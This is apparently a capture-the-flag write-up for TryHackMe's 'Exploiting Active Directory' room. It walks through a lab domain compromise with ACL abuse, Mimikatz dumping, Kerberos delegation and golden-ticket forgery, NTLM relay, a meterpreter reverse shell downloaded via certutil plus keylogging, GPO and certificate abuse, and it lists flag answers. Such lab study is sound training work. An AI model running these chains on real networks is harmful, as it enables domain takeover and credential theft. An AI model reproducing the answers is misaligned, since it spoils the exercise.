![Exploiting Active Directory Banner](https://assets.tryhackme.com/room-banners/attacking-ad.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directory_Cover.png" alt="Exploiting Active Directory Logo">
</p>

# Exploiting Active Directory

This guide contains the answer and steps necessary to get to them for the [Exploiting Active Directory](https://tryhackme.com/room/exploitingad) room.

## Table of contents

- [Exploiting Permission Delegation](#exploiting-permission-delegation)
- [Exploiting Kerberos Delegation](#exploiting-kerberos-delegation)
- [Exploiting Automated Relays](#exploiting-automated-relays)
- [Exploiting AD Users](#exploiting-ad-users)
- [Exploiting GPOs](#exploiting-gpos)
- [Exploiting Certificates](#exploiting-certificates)
- [Exploiting Domain Trusts](#exploiting-domain-trusts)

### Exploiting Permission Delegation

1. Which ACE would allow you to update any non-protected parameter of a target object?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>GenericWrite</details>

2. What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?
   
   First we should add our account to the "IT Support" group so we are able to change admin account passwords.

   ```cmd
   Add-ADGroupMember "IT Support" -Members "lorraine.gill"
   Get-ADGroupMember "IT Support"
   ```

   ![Permissions It](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_It.png)
   
   Next, we should look for a tier 2 admin account for which we will change its password.

   ```cmd
   Get-ADGroupMember -Identity "Tier 2 Admins"
   ```

   ![Permissions Tier 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Tier_2.png)

   Setting a new password can be done with the following commands:

   ```cmd
   $Password = ConvertTo-SecureString "letmein1337" -AsPlainText -Force
   Set-ADAccountPassword -Identity "henry.shaw" -Reset -NewPassword $Password
   ```
   
   ![Permissions Set Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Set_Password.png)

   Now we can remote into the workstation with our admin account.

   Maybe you need to disconnect wait 10 minutes and reconnect for it to work. You could also run `gpupdate /force` and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.

   ![Permissions Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Flag.png)

   ><details><summary>Click for answer</summary>THM{Permission.Delegation.FTW!}</details>

### Exploiting Kerberos Delegation

1. Which Kerberos Delegation type allows for delegation of all services?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Unconstrained Delegation</details>

2. Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Resource-Based Constrained Delegation</details>

3. Which Constrained Delegation service allows access to the file system of the system via delegation?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>CIFS</details>

4. What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

   Using `Import-Module C:\Tools\PowerView.ps1` and `Get-NetUser -TrustedToAuth`, we can see that `svcIIS` has delegate permissions.

   ![Delegation Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Permissions.png)
   
   Make sure to be logged in to our t2 admin account and load mimikatz to dump the lsa secrets.

   ```cmd
   C:\Tools\mimikatz_trunk\x64\mimikatz.exe
   token::elevate
   lsadump::secrets
   ```

   ![Delegation Lsadump](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Lsadump.png)

   Now we can use `Kekeo` to generate a TGT for HTTP and WSMAN services.

   ```cmd
   C:\Tools\kekeo\x64\kekeo.exe
   tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:
   ```

   ![Delegation Tgt](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Tgt.png)

   Now that we have the TGT we can use it to forge TGS request for our svcIIS account. 

   ```cmd
   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:http/THMSERVER1.za.tryhackme.loc

   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:wsman/THMSERVER1.za.tryhackme.loc
   ```

   ![Delegation Tgs](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Tgs.png)

   In Mimikatz we set our token to default again and import the TGS tickets.

   ```cmd
   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
   ```

   ![Delegation Import](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Import.png)

   Last step is to now create a new PSSession and connect through it to thmserver1.

   ```
   New-PSSession -ComputerName thmserver1.za.tryhackme.loc
   Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
   ```

   ![Delegation Session](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Session.png)

   Once we are on the server we can find our flag.

   ><details><summary>Click for answer</summary>THM{Constrained.Delegation.Can.Be.Very.Bad}</details>

### Exploiting Automated Relays

1. How often (in days) are the passwords of Windows machine accounts rotated by default?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>30</details>

2. What should not be enforced if we want to relay an SMB authentication attempt?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>SMB Signing</details>

3. What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

   First, we should setup the relay on our attackbox.

   ```cmd
   python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.60.201" -debug
   ```
   
   ![Relay Setup](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Setup.png)

   Now we create a request from the workstation.
   
   ```cmd
   C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.57.135"
   ```
   
   ![Relay Request](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Request.png)

   We receive a hash dump from thmserver1 which we can use to login and get the flag. 

   ![Relay Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Credentials.png)

   In this case, I will use the previously gained access to get the flag.

   ![Relay Flag3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Flag3.png)

   ><details><summary>Click for answer</summary>THM{Printing.Some.Shellz}</details>

### Exploiting AD Users

1. What application is used to open the kdbx credential database?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>keepass</details>

2. What meterpreter command do we use to move from SYSTEM to user context?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>migrate</details>

3. What is the password of the credential database?

   After enumerating the user foldes, we indeed find a `.kdbx` file in the Downloads folder for the `trevor.local` account.
   
   First thing we do is prepare our shell using `msfvenom`.

   ```cmd
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
   ```

   We can already start a listener to catch our reverse shell.

   ```cmd
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.135; set LPORT 1337; exploit"
   ```

   ![Users Listener](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Listener.png)

   Using our previously created PSSession we can copy the payload to the server and execute it. 

   First, we setup a http server, then we can download the file from this server.

   ```cmd
   python3 -m http.server 8080
   ```

   ```cmd
   certutil.exe -urlcache -split -f http://10.50.57.135:8080/shell_t5.ps1
   ```

   ![Users Enumerate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Enumerate.png)

   Now this is done, we can excecute the payload and we should get back a shell.

   We need to migrate our session to another process. So we need to find the correct PID for the trevor account process using `ps | grep "explorer"`.

   We can then use the meterpreters `migrate` command to migrate our process. 

   ![Users Migrate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Migrate.png)

   First time I did this, the user process wasn't visible. So I had to run the following commands on the server through our PSSession.

   ```cmd
   net user trevor.local letmein1337!

   powershell
   C:\auto-login.ps1 trevor.local letmein1337! THMSERVER1
   shutdown -r
   ```

   After a couple of minutes it did work. But now, since the network hasn't been reset, the process was still running and I could continue normally.

   Now that we have migrated our process, we can start logging the users keypresses using `keyscan_start`.

   ![Users Keyscan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Keyscan.png)

   This should be the password to the database.

   ><details><summary>Click for answer</summary>Imreallysurenoonewillguessmypassword</details>

4. What is the value of the flag stored in the credential database?

   Now that we have the database password, we can try it and find the flag within.

   Open Keepassx and import the database file we downloaded. Enter the password we found to open it.

   ![Users Keepass](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Keepass.png)

   Now we should look for the flag in one of the entries.

   ![Users Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Users_Flag.png)

   ><details><summary>Click for answer</summary>THM{AD.Users.Can.Give.Up.Good.Secrets}</details>

### Exploiting GPOs

1. What object allowss users to configure Windows policies?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Group Policy Object</details>

2. What AD feature allows us to configure GPOs for the entire AD structure?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Group Policy Management</details>

3. What is the name of the GPO that our compromised AD account owns?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Management Server Pushes</details>

4. What is the value of the flag stored on THMSERVER2 in the Administrator's Desktop directory (flag4.txt)?

   In the database we found credentials for the user `svcServMan`, looking through Bloodhound is has ownership over a GPO we can exploit.

   ![Gpo Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Gpo_Exploit.png)

   We should RDP into wrk1 with our t2 admin account. After that we can load the credentials using `runas` and open a command prompt.

   Now start the management console using `mmc`.

   In here we need to load the 'Group Policy Management' add in.

   ![Gpo Management](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Gpo_Management.png)

   Now drill down all the way to management servers and right-click the available GPO.

   In the GPO editor drill down to Restricted groups and add a group called "IT Support".

   Make it a member of the 'Administrators' and 'Remote Desktop Users' groups.

   ![Gpo Change](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Gpo_Change.png)
   
   Now that this is done, we can user our initial user account (lorraine.gill) to RDP into server2 and find our flag!

   ![Gpo Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Gpo_Flag.png)

   ><details><summary>Click for answer</summary>THM{Exploiting.GPOs.For.Fun.And.Profit}</details>

### Exploiting Certificates

1. What does the user create to ask the CA for a certificate?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Certificate Signing Request</details>

2. What is the name of Microsoft's PKI implementation?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Active Directory Certificate Services</details>

3. What is the value of the flag stored on THMDC in the Administrator's Desktop directory (flag5.txt)?

   RDP into server2 using our initial user account. Then start `mmc` and add the `certificates` add-in.

   Select the computer account and local computer.

   ![Certificates Addin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Addin.png)

   In this window select `Personal` and request a new certificate.

   ![Certificates New](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_New.png)

   For the additional information that is required provide a CN and the UPN of the user you want to impersonate (for example: Administrator@za.tryhackme.loc).

   ![Certificates Information](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Information.png)

   Select the certificate and click enroll.

   Now export the certificate with the private keys. Add a password and select a name and location for the file. 

   ![Certificates Export](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Export.png)

   The next step is to use `Rubeus` to request a TGT.

   ```cmd
   C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:"C:\Users\lorraine.gill\letmein.pfx" /password:letmein1337! /outfile:pwnd1337.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101
   ```

   ![Certificates Rubeus](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Rubeus.png)

   The final step is to load the TGT in Mimikatz and check if we can authenticate to the DC.

   ```cmd
   C:\Tools\mimikatz.exe
   privilege::debug
   kerberos::ptt pwnd1337.kirbi
   exit

   dir \\thmdc.za.tryhackme.loc\c$t
   ```

   ![Certificates Authenticate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Authenticate.png)

   Als we need to do now is read the flag on the Administrators desktop.

   ```cmd
   type \\thmdc.za.tryhackme.loc\c$\Users\Administrator\Desktop\flag5.txt
   ```

   ![Certificates Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Certificates_Flag.png)

   ><details><summary>Click for answer</summary>THM{AD.Certs.Can.Get.You.DA}</details>

### Exploiting Domain Trusts

1. What domain trust relationship is by default configured between a parent and a child domain?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary></details>

2. What is the name of the AD account used by the KDC to encrypt and sign TGTs?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary></details>

3. What is the name of the TGT that grants access to resources outside of our current domain?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary></details>

4. What is the value of the flag stored on THMROOTDC in the Administrator's Desktop folder (flag6.txt)?

   The final step in getting full domain access is creating a golden ticket and inter-realm tgt.

   First lets find the SIDs for the DC and Enterprise Admins group.

   ```powershell
   Get-ADComputer -Identity "THMDC"
   Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
   ```

   ![Trust Sids](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Trust_Sids.png)

   In mimikatz we can now generate a golden ticket 

   ```powershell
   kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
   ```

   ![Trust Golden](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Trust_Golden.png)

   We can test to see if this ticket works on both thmdc.za and thmrootdc.

   ```powershell
   dir \\thmdc.za.tryhackme.loc\c$
   dir \\thmrootdc.tryhackme.loc\c$
   ```

   ![Trust Authenticate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Trust_Authenticate.png)

   Now we have compromised the entire DC and can find the flag on the Administrators desktop.

   ```powershell
   type \\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt
   ```

   ![Trust Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/exploitingad/Exploiting_Active_Directoy_Trust_Flag.png)

   ><details><summary>Click for answer</summary>THM{Full.EA.Compromise}</details>